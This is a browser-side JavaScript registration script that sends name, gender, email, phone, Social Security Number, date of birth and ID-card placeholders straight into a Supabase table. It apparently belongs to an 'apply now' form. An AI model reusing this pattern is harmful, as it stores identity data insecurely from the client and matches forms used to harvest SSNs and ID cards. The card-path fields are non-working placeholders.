// Register.js

// Import the Supabase client
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
import { domain, anonKey } from './dbData.js'; // Import domain and anonKey from a separate file

// Initialize Supabase client
const supabase = createClient(domain, anonKey);

const form = document.getElementById("reg-form");
const submitButton = document.getElementById("submit");

form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // Show loading message
    submitButton.innerHTML = 'Loading...';

    // Get form data
    const firstName = document.getElementById('first-name').value.trim(); // Get and trim first name
    const lastName = document.getElementById('last-name').value.trim(); // Get and trim last name
    const gender = document.getElementById('gender').value; // Get gender value
    const remember = document.getElementById('agree').checked; // Get checkbox value (true or false)
    const email = document.getElementById('email').value.trim(); // Get and trim email
    const phoneNumber = document.getElementById('phone').value.trim(); // Get and trim phone number
    const socialSecurityNumber = document.getElementById('social-sec-num').value.trim(); // Get and trim SSN
    const dob = document.getElementById('DOB').value; // Get DOB value

    // Construct JSON data with uploaded file paths and checkbox value as boolean
    const jsonData = {
        "First Name": firstName,
        "Last Name": lastName,
        "Gender": gender,
        "Email": email,
        "Social Security Number": socialSecurityNumber,
        "Date of Birth": dob,
        "Phone Number": phoneNumber,
        "Front Card": 'frontCardPath', // Assign file path to Front Card
        "Back Card": 'backCardPath', // Assign file path to Back Card
        "Remember": remember // Assign checkbox value (true or false)
    };

    // Insert data into the user_data table
    const { error, data } = await supabase.from('user_data').insert([jsonData]);

    // Reset button text
    submitButton.innerHTML = 'APPLY NOW';

    if (error) {
        console.error('Error inserting data:', error.message);
        alert('Failed to submit the form. Please try again.');
    } else {
        console.log('Data inserted successfully:', data);
        alert('Form submitted successfully!');
        // Redirect or perform any other action upon successful insertion
    }
});
